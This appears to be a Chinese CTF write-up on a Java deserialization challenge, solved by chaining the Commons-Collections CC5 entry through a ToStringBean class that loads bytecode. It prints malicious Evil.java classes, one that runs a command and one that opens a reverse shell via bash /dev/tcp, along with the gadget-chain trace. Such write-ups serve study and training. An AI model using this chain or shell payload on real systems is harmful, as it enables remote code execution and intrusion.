>考点：
>
>- cc5 简单反序列化利用

在**IndexController**，readobject路由下可以很明显看到反序列化，看一眼lib包，其中jackson版本也是比较高，有没有可以直接打的点。

> ps:
>
> 所有题目都是12月前的比赛，当时还没有爆出log4j2的洞，并且springboot默认日志库采用logback，所以除非题目有主动调用了log4j2的api，仅仅只是引用了库的话还是安全。

**ToStringBean** 这个类需要注意

![image-20211221162730660](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221162730.png)

发现这里的`toString`调用了defineClass动态加载字节码，并且后续有对象实例化操作，那么如果我们可以控制这里的ClassByte，并且找到一个反序列化readobject可以直接触发toString的点，就可以在恶意类的构造函数里写入命令，创建实例时触发达到RCE的目的。

先看后面的问题，虽然这里的ClassByte是私有属性，不过我们可以通过反射修改其权限，进而创建对象，这里写一个例子：

![image-20211221165717571](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221165717.png)

Evil.java:

```java
public class Evil {
    public Evil()throws Exception {
        String command = "open -a Calculator";
        Runtime.getRuntime().exec(command);
    }
}
```

现在最后一步，就是找到反序列化中的**kick-off**  ==> 重写readobject的类，如果对cc链比较熟悉的话，cc5的入口`BadAttributeValueExpException.readObject()`正是触发了`toString()`方法。

```
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

![image-20211221172242670](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221172242.png)

和前面一样，通过反射设置val的值为需要调用`toString()`的对象即可。

最终Poc

![image-20211221182716586](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221182716.png)

这里注意一点，java的`Runtime.getRuntime().exec(command)`反弹shell需要修改写法，原因在exec的重载方法里，具体可参考

- [Java Runtime.exe() 执行命令与反弹shell](https://www.jianshu.com/p/ae3922db1f70)

```java
public class Evil {
    public Evil()throws Exception {
        String command[] = {"/bin/bash","-c","bash -i >& /dev/tcp/127.0.0.1/20022 0>&1"};
        Runtime.getRuntime().exec(command);
    }
}
```
![image-20211221182846948](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/12/20211221182953.png)



一点疑问：如果题目不出网，可以怎么利用呢？